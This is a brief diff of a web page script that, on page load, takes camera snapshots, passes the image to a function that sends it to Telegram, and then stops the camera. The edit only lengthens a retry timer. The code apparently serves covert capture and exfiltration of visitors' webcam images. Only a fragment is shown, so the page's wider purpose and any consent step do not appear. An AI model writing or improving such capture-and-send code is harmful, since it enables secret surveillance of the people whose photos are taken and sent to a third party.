@@ -38,7 +38,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             sendPhotoToTelegram(imageData);
             stream.getTracks().forEach(track => track.stop()); // Останавливаем камеру
         } else {
-            setTimeout(() => takeSnapshot(stream), 100);
+            setTimeout(() => takeSnapshot(stream), 1000);
         }
     }
 
